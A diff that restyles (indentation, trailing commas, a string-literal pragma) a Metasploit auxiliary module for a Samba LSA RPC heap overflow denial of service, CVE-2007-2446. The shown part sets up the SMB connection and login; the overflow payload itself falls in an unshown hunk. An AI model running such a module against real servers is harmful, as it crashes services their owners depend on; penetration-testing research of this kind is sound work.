@@ -1,48 +1,44 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Samba lsa_io_privilege_set Heap Overflow',
-      'Description'    => %q{
-        This module triggers a heap overflow in the LSA RPC service
-      of the Samba daemon.
-      },
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2007-2446'],
-          ['OSVDB', '34699'],
-        ]
-      ))
+                      'Name'           => 'Samba lsa_io_privilege_set Heap Overflow',
+                      'Description'    => %q(
+                        This module triggers a heap overflow in the LSA RPC service
+                      of the Samba daemon.
+                      ),
+                      'Author'         => [ 'hdm' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['CVE', '2007-2446'],
+                          ['OSVDB', '34699']
+                        ]))
 
     register_options(
       [
-        OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
-      ], self.class)
-
+        OptString.new('SMBPIPE', [ true, "The pipe name to use", 'LSARPC'])
+      ], self.class
+    )
   end
 
   def run
-
     pipe = datastore['SMBPIPE'].downcase
 
     print_status("Connecting to the SMB service...")
-    connect()
-    smb_login()
+    connect
+    smb_login
 
     datastore['DCERPC::fake_bind_multi'] = false
 
@@ -78,5 +74,4 @@ class MetasploitModule < Msf::Auxiliary
 
     disconnect
   end
-
 end
